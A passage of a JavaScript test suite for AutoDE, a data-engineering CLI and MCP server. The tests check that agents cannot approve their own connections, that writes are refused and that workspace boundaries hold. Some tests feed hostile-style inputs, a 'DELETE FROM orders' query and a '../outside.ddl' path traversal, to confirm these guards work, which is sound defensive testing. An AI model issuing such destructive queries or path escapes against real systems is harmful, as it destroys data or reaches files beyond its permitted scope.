      assert.strictEqual((await cli(['connections', 'add', ...W, '--platform', 'oracle', '--role', 'source', '--resolver', 'vscode', '--ref', 'x'], { interactive: true })).code, 2, 'VS Code secret storage is not reachable here');
      assert.strictEqual((await cli(['connections', 'frob', ...W])).code, 2);
      // test: records failure and success; unknown id is not found.
      const failing = connHarness({ fail: 'JWT token is invalid' });
      try {
        const t = await cli(['connections', 'test', 'snowflake:ACME-XY1', ...W], { platform: failing.platform, env: {} });
        assert.strictEqual(t.code, 6, t.err);
        assert.strictEqual((await cli(['connections', 'list', ...W, '--json'])).json().connections[0].status.autode, 'failed');
      } finally { failing.done(); }
      const ok = await cli(['connections', 'test', 'snowflake:ACME-XY1', ...W], { platform: h.platform, env: {} });
      assert.strictEqual(ok.code, 0, ok.err);
      assert.strictEqual((await cli(['connections', 'list', ...W, '--json'])).json().connections[0].status.autode, 'ready');
      assert.strictEqual((await cli(['connections', 'test', 'snowflake:nope', ...W], { platform: h.platform })).code, 5);
      // remove: confirmed by a person.
      assert.strictEqual((await cli(['connections', 'remove', 'snowflake:ACME-XY1', ...W], { interactive: true, answers: ['no'] })).code, 4);
      const rm = await cli(['connections', 'remove', 'snowflake:ACME-XY1', ...W], { interactive: true, answers: ['remove'] });
      assert.strictEqual(rm.code, 0, rm.out);
      assert.deepStrictEqual((await cli(['connections', 'list', ...W, '--json'])).json().connections, []);
    } finally { h.done(); }
  });

  await test('v0.43.1: an agent proposes a connection over MCP; a person approves it (not the agent) and the engine saves it', async () => {
    const f = await mcpWorkspace();
    const client = await mcpSession(f.ws);
    const call = async (name, args) => (await client.callTool({ name, arguments: args })).structuredContent;
    try {
      const secret = await call('autode_propose_connection', { connection: { platform: 'snowflake', role: 'source', fields: { account: 'ACME', token: 'abc' }, credentials: { resolver: 'env' } } });
      assert.strictEqual(secret.code, 'VALIDATION_FAILED');
      assert.ok(secret.details.errors.some((e) => /can't be written/.test(e)));
      const p = await call('autode_propose_connection', { connection: { platform: 'databricks', role: 'source', fields: { httpPath: '/sql/1.0/warehouses/w', catalog: 'main' }, credentials: { resolver: 'cli', ref: 'prod' } }, skill: 'onboarding' });
      assert.deepStrictEqual([p.decision.kind, p.decision.stakes, p.decision.status, p.decision.title], ['connection', 'high', 'pending', 'Connection databricks:prod (databricks, source)']);
      assert.ok(p.decision.validation.warnings.some((w) => /profile \[prod\]/.test(w)));
      assert.strictEqual((await call('autode_resolve_decision', { id: p.decision.id, decision: 'approved', by: 'agent' })).code, 'PERMISSION_DENIED', 'an agent cannot approve its own connection');
      assert.ok(!require('node:fs').existsSync(require('node:path').join(f.ws, '.autode', 'config', 'connections.yaml')));
      const r = await cli(['decisions', 'approve', p.decision.id, '--workspace', f.ws, '--by', 'priya'], { interactive: true, answers: ['approve'] });
      assert.strictEqual(r.code, 0, r.out + r.err);
      assert.ok(/connection databricks:prod saved/.test(r.out) && /autode connections test databricks:prod/.test(r.out), r.out);
      const listed = await call('autode_list_connections', {});
      assert.ok(listed.connections.some((c) => c.id === 'databricks:prod'), JSON.stringify(listed));
    } finally { await client.close(); f.done(); }
  });

  // ── v0.43.2: parity step 1a — business problems and the estate without VS Code ──

  await test('v0.43.2: business problems from the CLI and MCP — start, list, select; a problem started in a terminal is the one an agent proposes against, and the panel reads it', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-prob-'));
    const W = ['--workspace', ws];
    let client;
    try {
      assert.ok(/No business problems yet/.test((await cli(['problems', 'list', ...W])).out));
      const a = await cli(['problems', 'new', 'Merge the shop and CRM customer data into one analytics model', ...W, '--json']);
      assert.strictEqual(a.code, 0, a.err);
      const idA = a.json().id;
      assert.ok(/^merge-shop-crm-customer-data-/.test(idA), idA);
      const spec = fresh('../dist/engine/documents/problemDocuments.js').parseBusinessProblemSpec(nodeFs.readFileSync(nodePath.join(ws, '.autode', 'problems', idA, 'spec', 'business-problem.yaml'), 'utf8'));
      assert.deepStrictEqual([spec.status, spec.version, spec.problemStatementApproved, spec.problemStatement], ['draft', 1, false, 'Merge the shop and CRM customer data into one analytics model'], 'a first draft, nothing approved');
      // The panel's own reader lists it (same folders, same pointer).
      const { ActiveProblemManager } = withMock(createMock(), () => fresh('../dist/context/ActiveProblemManager.js'));
      void ActiveProblemManager;
      assert.strictEqual(fresh('../dist/engine/documents/problems.js').activeProblemId(ws), idA);
      assert.strictEqual((await cli(['problems', 'new', ...W])).code, 2);
      // An agent: list, start another, select back; then a proposal works against the selected problem.
      client = await mcpSession(ws);
      const call = async (name, args) => (await client.callTool({ name, arguments: args })).structuredContent;
      const b = await call('autode_start_problem', { problemStatement: 'Modernize the legacy HR payroll feeds onto Databricks' });
      assert.ok(b.active && b.status === 'draft', JSON.stringify(b));
      assert.deepStrictEqual((await call('autode_list_problems', {})).problems.filter((p) => p.isActive).map((p) => p.id), [b.id]);
      assert.strictEqual((await call('autode_select_problem', { id: 'nope' })).code, 'NOT_FOUND');
      assert.deepStrictEqual(await call('autode_select_problem', { id: idA }), { id: idA, active: true });
      const prop = await call('autode_propose_spec_change', { spec: { problemStatement: 'Merge the shop and CRM customer data into one analytics model', objectives: ['One customer view'], scope: { in: ['shop', 'crm'], out: [] } } });
      assert.strictEqual(prop.decision.problemId, idA, JSON.stringify(prop));
      const listed = await cli(['problems', 'list', ...W]);
      assert.ok(new RegExp(`\\* ${idA}`).test(listed.out) && listed.out.includes(b.id), listed.out);
      assert.strictEqual((await cli(['problems', 'use', b.id, ...W])).code, 0);
      assert.strictEqual(fresh('../dist/engine/documents/problems.js').activeProblemId(ws), b.id);
      assert.strictEqual((await cli(['problems', 'use', 'nope', ...W])).code, 5);
    } finally { if (client) await client.close(); nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.43.2: the estate without VS Code — DDL files and a connection\'s schemas into catalog, working set and ledger, through the panel\'s own ContextFileManager; grounding and resolve then know them', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-estate-'));
    const W = ['--workspace', ws];
    const ref = (f) => nodePath.join(__dirname, 'reference', 'retail-orders', 'sources', f);
    let client;
    try {
      const r = await cli(['estate', 'ingest', ref('shop.ddl'), ...W, '--system', 'shop', '--json']);
      assert.strictEqual(r.code, 0, r.err);
      assert.deepStrictEqual([r.json().results[0].system, r.json().results[0].tables], ['shop', 11]);
      const r2 = await cli(['estate', 'ingest', ref('crm.ddl'), ...W, '--system', 'crm']);
      assert.ok(/system crm/.test(r2.out), r2.out);
      const show = (await cli(['estate', 'show', ...W, '--json'])).json();
      assert.deepStrictEqual(show.estate.systems.map((s) => s.id).sort(), ['crm', 'shop']);
      assert.deepStrictEqual(show.catalog.map((c) => [c.key, c.tables]).sort(), [['crm/default', 9], ['shop/default', 11]]);
      assert.ok(/shop\.ddl → shop/.test((await cli(['estate', 'show', ...W])).out));
      // The estate is AutoDE's for every surface: grounding knows the tables now.
      nodeFs.writeFileSync(nodePath.join(ws, 'q.sql'), 'SELECT o.order_id FROM shop.orders o');
      assert.strictEqual((await cli(['grounding', nodePath.join(ws, 'q.sql'), ...W])).code, 0);
      assert.strictEqual((await cli(['estate', 'ingest', nodePath.join(ws, 'q.txt'), ...W])).code, 5);
      nodeFs.writeFileSync(nodePath.join(ws, 'notes.txt'), 'hello');
      assert.strictEqual((await cli(['estate', 'ingest', nodePath.join(ws, 'notes.txt'), ...W])).code, 1, 'unsupported type');
      assert.strictEqual((await cli(['estate', 'extract', ...W])).code, 2, '--connection is needed');
      // MCP: a file inside the workspace only; then resolve finds what it brought in.
      nodeFs.copyFileSync(ref('hr_legacy.ddl'), nodePath.join(ws, 'hr_legacy.ddl'));
      client = await mcpSession(ws);
      const call = async (name, args) => (await client.callTool({ name, arguments: args })).structuredContent;
      assert.strictEqual((await call('autode_ingest_file', { path: '../outside.ddl' })).code, 'PERMISSION_DENIED');
      const m = await call('autode_ingest_file', { path: 'hr_legacy.ddl', system: 'hr' });
      assert.ok(m.result.tables > 0 && m.result.system === 'hr', JSON.stringify(m));
      const tools = (await client.listTools()).tools;
      for (const n of ['autode_ingest_file', 'autode_ingest_metadata', 'autode_start_problem', 'autode_select_problem']) {
        const t = tools.find((x) => x.name === n);
        assert.deepStrictEqual([t.annotations.readOnlyHint, t.annotations.destructiveHint], [false, false], `${n} records, never destroys`);
      }
      const hits = await call('autode_resolve', { text: 'employee' });
      assert.ok(hits.matches.some((x) => /obj:hr\//.test(x.id)), JSON.stringify(hits.matches.slice(0, 3)));
    } finally { if (client) await client.close(); nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.43.2: a connection\'s schemas come in with `autode estate extract` and `autode_ingest_metadata`, under the estate system they are bound to', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const { PlatformSession } = fresh('../dist/mcp/platform.js');
    const { ConnectionManager } = fresh('../dist/engine/platform/ConnectionManager.js');
    const { BaseDataSourceAdapter } = fresh('../dist/engine/platform/BaseAdapter.js');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-extract-'));
    nodeFs.mkdirSync(nodePath.join(ws, '.autode', 'config'), { recursive: true });
    nodeFs.writeFileSync(nodePath.join(ws, '.autode', 'config', 'connections.yaml'), 'connections:\n  - platform: snowflake\n    account: ACME\n    username: me\n    database: SALES\n');
    const asked = [];
    const snapshot = (schema) => ({ platform: 'snowflake', connectionId: 'snowflake:ACME', extractedAt: 't', views: [], foreignKeys: [], lineage: [], tables: [{ schema, name: 'ORDERS', fqn: `SALES.${schema}.ORDERS`, type: 'TABLE', columns: [{ name: 'ORDER_ID', dataType: 'NUMBER', isNullable: false, isPrimaryKey: true, isForeignKey: false, ordinalPosition: 1 }, { name: 'AMOUNT', dataType: 'NUMBER(12,2)', isNullable: true, isPrimaryKey: false, isForeignKey: false, ordinalPosition: 2 }] }] });
    const fakeAdapter = () => ({
      async connect() { return { connected: true, platform: 'snowflake', databaseName: 'SALES', schemaName: 'RAW', version: '9', capabilities: {} }; },
      async disconnect() {}, dispose() {}, getConnectionId: () => 'snowflake:ACME', getCapabilities: () => ({}),
      async extractMetadata(o) { asked.push(o); return snapshot(o.schemaFilter[0].split('.').pop()); },
      snapshotToGraph: (s, identity) => BaseDataSourceAdapter.prototype.snapshotToGraph.call({}, s, identity)
    });
    const platform = (o) => new PlatformSession({ ...o, allowWrite: false, log: () => {}, createManager: (log, options) => { const m = new ConnectionManager(log, options); m.registerAdapterFactory('snowflake', fakeAdapter); return m; } });
    try {
      const r = await cli(['estate', 'extract', '--connection', 'snowflake:ACME', '--schema', 'SALES.RAW', '--system', 'sales', '--workspace', ws, '--json'], { platform });
      assert.strictEqual(r.code, 0, r.out + r.err);
      assert.deepStrictEqual([r.json().results[0].system, r.json().results[0].tables, asked[0].schemaFilter, asked[0].includeProfiling], ['sales', 1, ['SALES.RAW'], false]);
      const show = (await cli(['estate', 'show', '--workspace', ws, '--json'])).json();
      assert.deepStrictEqual(show.estate.bindings.map((b) => [b.connection, b.system, b.schemas]), [['snowflake:ACME', 'sales', ['SALES.RAW']]]);
      // The binding remembers the schemas: a second extract needs none.
      assert.strictEqual((await cli(['estate', 'extract', '--connection', 'snowflake:ACME', '--workspace', ws], { platform })).code, 0);
      assert.deepStrictEqual(asked[1].schemaFilter, ['SALES.RAW']);
      // Over MCP, through the server's own session (here: a fake adapter in-process).
      const { createAutodeServer } = fresh('../dist/mcp/server.js');
      const { Client } = require('@modelcontextprotocol/sdk/client/index.js');
      const { InMemoryTransport } = require('@modelcontextprotocol/sdk/inMemory.js');
      const server = createAutodeServer({ workspaceRoot: ws, resourcesRoot: nodePath.join(__dirname, '..'), version: 't', platform: platform({ workspaceRoot: ws, allowCli: false }), log: () => {} });
      const [x, y] = InMemoryTransport.createLinkedPair();
      await server.connect(x);
      const client = new Client({ name: 't', version: '1' });
      await client.connect(y);
      try {
        const m = (await client.callTool({ name: 'autode_ingest_metadata', arguments: { connectionId: 'snowflake:ACME', schemas: ['SALES.MART'] } })).structuredContent;
        assert.deepStrictEqual([m.result.system, m.result.tables], ['sales', 1], JSON.stringify(m));
        const g = (await client.callTool({ name: 'autode_check_grounding', arguments: { content: 'SELECT order_id, amount FROM sales.mart.orders' } })).structuredContent;
        assert.strictEqual(g.unresolved.length, 0, JSON.stringify(g));
      } finally { await client.close(); }
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  // ── v0.43.3: parity step 1b — facts, pack, vocabulary, design doc and SQL without VS Code ──

  await test('v0.43.3: autode facts — the Context Inbox in a terminal: list with stakes and corrections, confirm, reject, edit, bulk-confirm documented facts; only a person, and the panel shares the logic', async () => {
    const f = await mcpWorkspace();
    const W = ['--workspace', f.ws];
    try {
      const { AssertionLedger } = fresh('../dist/engine/context/ledger.js');
      const nodePath = require('node:path');
      const ledger = new AssertionLedger(nodePath.join(f.ws, '.autode', 'knowledge', 'ledger'));
      await ledger.load();
      const key = await ledger.assert({ kind: 'key', subject: ['obj:shop/prod/shop.orders'], predicate: 'primary', value: ['order_id'], statement: 'order_id is the key of shop.orders', evidence: [{ type: 'chat_message', ref: 'chat:1#2' }], createdBy: 'mcp:claude-code' });
      const term = await ledger.assert({ kind: 'business_term', subject: ['obj:shop/prod/shop.orders'], predicate: 'defined_as', value: { term: 'Order', definition: 'A purchase' }, statement: 'An order is a purchase.', evidence: [{ type: 'file', ref: 'docs/glossary.md' }], createdBy: 'mcp:claude-code' });
      const docs = [];
      for (const n of ['customer_id', 'email']) docs.push(await ledger.assert({ kind: 'business_term', subject: [`obj:shop/prod/shop.customers.${n}`], predicate: 'defined_as', value: { term: n, definition: n }, statement: `${n} is documented.`, evidence: [{ type: 'file', ref: 'brd.md' }], trust: 'documented', createdBy: 'pack:brd' }));
      const list = await cli(['facts', ...W, '--json']);
      const byId = new Map(list.json().facts.map((x) => [x.id, x]));
      assert.deepStrictEqual([byId.get(key.id).stakes, byId.get(term.id).stakes, list.json().facts.length], ['high', 'low', 4]);
      assert.ok(/order_id is the key of shop\.orders/.test((await cli(['facts', 'list', ...W])).out));
      assert.ok(/chat:1#2/.test((await cli(['facts', 'show', key.id, ...W])).out));
      // A person, in a terminal.
      assert.strictEqual((await cli(['facts', 'confirm', key.id, ...W])).code, 4);
      assert.strictEqual((await cli(['facts', 'confirm', key.id, ...W], { interactive: true, env: { CI: '1' }, answers: ['confirm'] })).code, 4);
      assert.strictEqual((await cli(['facts', 'confirm', key.id, ...W], { interactive: true, answers: ['no'] })).code, 4);
      const c = await cli(['facts', 'confirm', key.id, ...W, '--by', 'priya'], { interactive: true, answers: ['confirm'] });
      assert.strictEqual(c.code, 0, c.out + c.err);
      const after = async () => { const l = new AssertionLedger(nodePath.join(f.ws, '.autode', 'knowledge', 'ledger')); await l.load(); return l; };
      let l = await after();
      assert.deepStrictEqual([l.get(key.id).status, l.get(key.id).trust], ['active', 'confirmed']);
      // Edit: replaced by a confirmed fact with the new value.
      const e = await cli(['facts', 'edit', term.id, ...W, '--value', '{"term":"Order","definition":"A paid purchase"}'], { interactive: true, answers: ['edit'] });
      assert.strictEqual(e.code, 0, e.out + e.err);
      l = await after();
      assert.strictEqual(l.get(term.id).status, 'superseded');
      assert.ok(l.assertions().some((a) => a.status === 'active' && a.value && a.value.definition === 'A paid purchase'));
      assert.strictEqual((await cli(['facts', 'edit', term.id, ...W, '--value', 'not json'], { interactive: true, answers: ['edit'] })).code, 1);
      // Bulk: documented facts from one source only.
      const b = await cli(['facts', 'confirm', ...W, '--from', 'pack:brd'], { interactive: true, answers: ['confirm'] });
      assert.ok(b.code === 0 && /Confirmed 2 documented/.test(b.out), b.out + b.err);
      assert.strictEqual((await cli(['facts', 'confirm', ...W, '--from', 'mcp:claude-code'], { interactive: true, answers: ['confirm'] })).code, 5, 'not documented facts');
      assert.ok(/Nothing waits for review/.test((await cli(['facts', ...W])).out));
      assert.strictEqual((await cli(['facts', 'show', 'nope', ...W])).code, 5);
      // The panel uses the same engine functions (no copy of the logic).
      const src = require('node:fs').readFileSync(nodePath.join(__dirname, '..', 'src', 'core', 'webviewProvider.ts'), 'utf8');
      assert.ok(/from '\.\.\/engine\/context\/factReview'/.test(src) && !/ledger\.supersede\(/.test(src));
    } finally { f.done(); }
  });

  await test('v0.43.3: the pack without VS Code — add, apply through a confirmed profile, conformance on samples (CLI and MCP); an agent adds only drafts', async () => {
    const fs = require('node:fs'); const p = require('node:path');
    const env = await k2.cfm();
    let client;
    try {
      const big = require('../dist/engine/context/fileIngestion.js').parseFile(c4a.read('sources/crm.ddl'), 'crm.ddl', { system: 'crm', environment: 'prod' });
      await env.cfm.ingestParsed(big.nodes, big.edges);
      fs.mkdirSync(p.join(env.dir, 'docs'), { recursive: true });
      fs.writeFileSync(p.join(env.dir, 'docs', 'contract.yaml'), c4a.read('documents/pack/customer-contract.v1.yaml'));
      fs.writeFileSync(p.join(env.dir, 'docs', 'crm.csv'), c4a.read('sources/samples/crm_customers.csv'));
      const W = ['--workspace', env.dir];
      assert.strictEqual((await cli(['problems', 'new', 'Merge customer data against the contract', ...W])).code, 0);
      const add = await cli(['pack', 'add', p.join(env.dir, 'docs', 'contract.yaml'), '--role', 'contract', '--authority', 'signed', '--doc-version', '1', ...W], { interactive: true });
      assert.strictEqual(add.code, 0, add.out + add.err);
      assert.strictEqual((await cli(['pack', 'add', p.join(env.dir, 'docs', 'contract.yaml'), '--role', 'contract', '--authority', 'signed', '--doc-version', '1', ...W])).code, 4, 'a signed document is a person\'s call');
      // No confirmed profile yet: reported, nothing guessed.
      let ap = await cli(['pack', 'apply', ...W]);
      assert.strictEqual(ap.code, 1);
      assert.ok(/no confirmed profile fits/.test(ap.out), ap.out);
      fs.mkdirSync(p.join(env.dir, '.autode', 'knowledge', 'profiles'), { recursive: true });
      fs.writeFileSync(p.join(env.dir, '.autode', 'knowledge', 'profiles', 'house-contract.yaml'), c4a.read('documents/pack/profile.house-contract.yaml'));
      ap = await cli(['pack', 'apply', ...W, '--json']);
      assert.strictEqual(ap.code, 0, ap.out + ap.err);
      assert.deepStrictEqual([ap.json().results[0].status, ap.json().results[0].reconcile.asserted], ['applied', 7]);
      assert.ok(/contract\.yaml/.test((await cli(['pack', 'list', ...W])).out));
      // Over MCP: the agent adds the sample as a draft (its authority is forced), then checks conformance.
      client = await mcpSession(env.dir);
      const call = async (name, args) => (await client.callTool({ name, arguments: args })).structuredContent;
      const s = await call('autode_pack_add', { path: 'docs/crm.csv', role: 'sample', version: '1', table: 'obj:crm/prod/crm.customers' });
      assert.strictEqual(s.document.authority, 'draft');
      assert.strictEqual((await call('autode_pack_add', { path: 'docs/crm.csv', role: 'sample', version: '1' })).code, 'VALIDATION_FAILED', 'a sample names its table');
      const conf = await call('autode_check_conformance', {});
      assert.ok(conf.failures > 0 && /unique/.test(conf.markdown), JSON.stringify(conf).slice(0, 400));
      assert.strictEqual((await cli(['conformance', ...W])).code, 1, 'the CLI reports the same failure');
      const applied = await call('autode_pack_apply', {});
      assert.ok(applied.results.some((r) => r.status === 'applied') && applied.results.some((r) => r.status === 'registered'), JSON.stringify(applied));
      assert.strictEqual((await call('autode_pack_list', {})).documents.length, 2);
    } finally { if (client) await client.close(); env.cleanup(); }
  });

  await test('v0.43.3: vocabulary — mined in a terminal or by an agent; accepted by a person, or proposed by an agent as a low-stakes decision it may resolve after asking', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-vocab-'));
    const W = ['--workspace', ws];
    let client;
    try {
      nodeFs.writeFileSync(nodePath.join(ws, 'loyalty.ddl'), "CREATE TABLE loy.ptrn_acct (ptrn_no VARCHAR(20) COMMENT 'Patron number', engmt_id INT COMMENT 'Engagement identifier', ptrn_seg VARCHAR(10) COMMENT 'Patron segment');\nCREATE TABLE loy.ptrn_visit (ptrn_no VARCHAR(20) COMMENT 'Patron number', visit_dt DATE);\n");
      assert.strictEqual((await cli(['estate', 'ingest', nodePath.join(ws, 'loyalty.ddl'), ...W])).code, 0);
      const mined = (await cli(['vocabulary', 'mine', ...W, '--json'])).json().proposals;
      assert.ok(mined.some((m) => m.from === 'ptrn' && m.to === 'patron'), JSON.stringify(mined));
      assert.strictEqual((await cli(['vocabulary', 'accept', ...W])).code, 4);
      const acc = await cli(['vocabulary', 'accept', ...W], { interactive: true, answers: ['1'] });
      assert.strictEqual(acc.code, 0, acc.out + acc.err);
      const file = nodePath.join(ws, '.autode', 'knowledge', 'vocabulary.yaml');
      assert.ok(nodeFs.existsSync(file) && /ptrn|patron/.test(nodeFs.readFileSync(file, 'utf8')));
      client = await mcpSession(ws);
      const call = async (name, args) => (await client.callTool({ name, arguments: args })).structuredContent;
      const agentMined = await call('autode_mine_vocabulary', {});
      assert.ok(!agentMined.proposals.some((m) => m.from === mined[0].from), 'accepted entries are no longer proposed');
      assert.strictEqual((await call('autode_propose_vocabulary', { vocabulary: { entries: [{ kind: 'synonym', from: 'client account', to: 'customer' }] } })).code, 'VALIDATION_FAILED', 'single words');
      const pr = await call('autode_propose_vocabulary', { vocabulary: { entries: [{ kind: 'synonym', from: 'guest', to: 'patron' }] } });
      assert.deepStrictEqual([pr.decision.kind, pr.decision.stakes], ['vocabulary', 'low']);
      const res = await call('autode_resolve_decision', { id: pr.decision.id, decision: 'approved', by: 'jdoe' });
      assert.ok(res.applied, JSON.stringify(res));
      assert.ok(/guest/.test(nodeFs.readFileSync(file, 'utf8')));
    } finally { if (client) await client.close(); nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.43.3: design-doc, query and explain from the CLI use the MCP tools\' handlers (the same read-only guard and sample-data gate)', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const f = await mcpWorkspace();
    const W = ['--workspace', f.ws];
    const out = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-dd-'));
    try {
      const d = await cli(['design-doc', ...W]);
      assert.strictEqual(d.code, 0, d.err);
      assert.ok(/^#/m.test(d.out), d.out.slice(0, 200));
      assert.strictEqual((await cli(['design-doc', ...W, '--out', nodePath.join(out, 'design.md')])).code, 0);
      assert.ok(/^#/m.test(nodeFs.readFileSync(nodePath.join(out, 'design.md'), 'utf8')));
      // query/explain over a fake Snowflake: rows withheld without consent; writes refused.
      nodeFs.mkdirSync(nodePath.join(f.ws, '.autode', 'config'), { recursive: true });
      nodeFs.writeFileSync(nodePath.join(f.ws, '.autode', 'config', 'connections.yaml'), 'connections:\n  - platform: snowflake\n    account: ACME\n    username: me\n    database: D\n');
      const { PlatformSession } = fresh('../dist/mcp/platform.js');
      const { ConnectionManager } = fresh('../dist/engine/platform/ConnectionManager.js');
      const executed = [];
      const fake = () => ({ async connect() { return { connected: true, platform: 'snowflake', databaseName: 'D', schemaName: 'S', version: '9', capabilities: {} }; }, async disconnect() {}, dispose() {}, getConnectionId: () => 'snowflake:ACME', getCapabilities: () => ({}),
        async executeQuery(sql) { executed.push(sql); return /^EXPLAIN/i.test(sql) ? { columns: ['plan'], rows: [{ plan: 'TableScan ORDERS' }], rowCount: 1, executionTimeMs: 1 } : { columns: ['order_id', 'email'], rows: [{ order_id: 7, email: 'pat@example.com' }], rowCount: 1, executionTimeMs: 1 }; } });
      const platform = (o) => new PlatformSession({ ...o, allowWrite: false, log: () => {}, createManager: (log, options) => { const m = new ConnectionManager(log, options); m.registerAdapterFactory('snowflake', fake); return m; } });
      const q = await cli(['query', '--connection', 'snowflake:ACME', 'SELECT order_id, email FROM orders', ...W], { platform });
      assert.strictEqual(q.code, 0, q.err);
      assert.ok(/1 row\(s\) — row values withheld/.test(q.out) && !/pat@example\.com/.test(q.out), q.out);
      assert.strictEqual((await cli(['query', '--connection', 'snowflake:ACME', 'DELETE FROM orders', ...W], { platform })).code, 4, 'a write is refused');
      assert.ok(executed.every((s) => !/DELETE/i.test(s)));
      const e = await cli(['explain', '--connection', 'snowflake:ACME', 'SELECT 1', ...W], { platform });
      assert.ok(e.code === 0 && /TableScan ORDERS/.test(e.out), e.out + e.err);
      assert.strictEqual((await cli(['query', 'SELECT 1', ...W])).code, 2, '--connection is needed');
    } finally { f.done(); nodeFs.rmSync(out, { recursive: true, force: true }); }
  });

  // ── v0.44.0: PA3a — workflow templates and runtime ──

  const wfRes = () => require('node:path').join(__dirname, '..');

  await test('v0.44.0: the bundled templates validate; a broken template is refused item by item; a workspace template overrides by id', () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const T = fresh('../dist/engine/workflows/templates.js');
    const { templates, errors } = T.loadTemplates(wfRes());
    assert.deepStrictEqual([templates.map((t) => t.id), errors], [['estate-merge', 'greenfield', 'modernization'], []]);
    const mod = templates.find((t) => t.id === 'modernization');
    assert.deepStrictEqual(mod.stages.filter((s) => s.inclusion === 'mandatory').map((s) => s.id), ['specify', 'plan', 'sources', 'target', 'mapping', 'build', 'reconcile', 'validate'], 'reconciliation is mandatory (owner, 2026-10-21)');
    assert.strictEqual(mod.stages.find((s) => s.id === 'model').inclusion, 'default', 'a lift-and-shift may drop the model');
    const broken = T.parseTemplate({ id: 'x', version: 1, stages: [
      { id: 'plan', kind: 'plan', inclusion: 'mandatory' },
      { id: 'specify', kind: 'specify', inclusion: 'default' },
      { id: 'a', kind: 'warp-drive' },
      { id: 'b', kind: 'conformance', inclusion: 'conditional' },
      { id: 'c', kind: 'reconcile', when: 'moon.phase > 2', after: ['d'] },
      { id: 'd', kind: 'validate', after: ['c'] },
      { id: 'e', kind: 'modelling', consumes: ['spec', 'mapping'] }
    ] }, 'test');
    const msg = broken.errors.join('\n');
    for (const want of [/first stage must be of kind specify/, /second stage must be of kind plan/, /unknown kind "warp-drive"/, /conditional stage needs "when"/, /Unknown fact "moon\.phase"/, /Dependency cycle: c → d → c|Dependency cycle: d → c → d/, /consumes mapping, which no stage/]) assert.ok(want.test(msg), `${want}\n${msg}`);
    const c = T.parseCondition('estate.sources > 1');
    assert.deepStrictEqual([c.test({ 'estate.sources': 2 }), c.test({ 'estate.sources': 1 }), T.parseCondition('not pack.has_contract').test({ 'pack.has_contract': true })], [true, false, false]);
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-wft-'));
    try {
      nodeFs.mkdirSync(nodePath.join(ws, '.autode', 'config', 'workflows'), { recursive: true });
      nodeFs.writeFileSync(nodePath.join(ws, '.autode', 'config', 'workflows', 'greenfield.yaml'), nodeFs.readFileSync(nodePath.join(wfRes(), 'workflows', 'greenfield.yaml'), 'utf8').replace('version: 1', 'version: 2').replace('title: Greenfield', 'title: Greenfield (house style)'));
      const r = T.loadTemplates(wfRes(), ws);
      const g = r.templates.find((t) => t.id === 'greenfield');
      assert.deepStrictEqual([g.version, g.title, r.templates.length], [2, 'Greenfield (house style)', 3]);
      assert.strictEqual(T.suggestTemplate(r.templates, 'Migrate the legacy warehouse', {}).id, 'modernization');
      assert.strictEqual(T.suggestTemplate(r.templates, 'Consolidate customer data after the acquisition', {}).id, 'estate-merge');
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.44.0: the deterministic draft and the plan checks — conditions decide, mandatory stages and gates stay, reasons are required, roles and tiers are bounded, consumed artifacts need producers', () => {
    const T = fresh('../dist/engine/workflows/templates.js');
    const I = fresh('../dist/engine/workflows/instance.js');
    const { templates } = T.loadTemplates(wfRes());
    const mod = templates.find((t) => t.id === 'modernization');
    const facts = { 'estate.sources': 2, 'estate.systems': 3, 'pack.has_contract': true, 'estate.has_legacy_code': false };
    const w = I.draftWorkflow(mod, 'p1', facts, ['crm', 'shop']);
    const st = (id) => w.stages.find((s) => s.id === id);
    assert.deepStrictEqual([st('conformance').included, st('code-conversion').included, st('code-conversion').reason, st('bi').included], [true, false, 'condition "estate.has_legacy_code" is false', false]);
    assert.deepStrictEqual(st('sources').tasks.map((t) => t.id), ['sources:crm', 'sources:shop'], 'repeat per source system: tasks inside the stage');
    assert.deepStrictEqual(I.checkWorkflow(w, mod).errors, []);
    const bad = JSON.parse(JSON.stringify(w));
    const b = (id) => bad.stages.find((s) => s.id === id);
    b('reconcile').included = false; b('reconcile').reason = 'tight deadline';
    b('model').included = false;
    b('mapping').gates = ['check'];
    b('quality').agent = { role: 'pipeline-engineer', tier: 'propose' };
    b('sources').agent = { role: 'source-assessor', tier: 'workspace-write' };
    bad.stages.push({ id: 'rehearsal', title: 'Cutover rehearsal', kind: 'deploy', origin: 'added', inclusion: 'optional', included: true, after: [{ stage: 'validate', approved: true }], consumes: ['artifacts'], produces: ['deployment'], gates: ['approve'], tasks: [], record: { status: 'pending' } });
    const r = I.checkWorkflow(bad, mod);
    const msg = r.errors.join('\n');
    for (const want of [/reconcile: a mandatory stage of modernization can't be left out/, /model: a default stage left out needs a reason/, /mapping: the approve gate can't be removed/, /quality: role pipeline-engineer can't do a quality-rules stage/, /sources: tier workspace-write is above the source-assessment ceiling \(platform-read\)/, /rehearsal: an added stage needs a reason/]) assert.ok(want.test(msg), `${want}\n${msg}`);
    assert.ok(r.warnings.some((x) => /Added stage rehearsal/.test(x)), 'added stages are flagged to the approver');
    // Dropping the sources leaves the mapping without its input.
    const noSrc = I.draftWorkflow(templates.find((t) => t.id === 'greenfield'), 'p2', { ...facts }, []);
    const s2 = noSrc.stages.find((s) => s.id === 'sources'); s2.included = false; s2.reason = 'no sources';
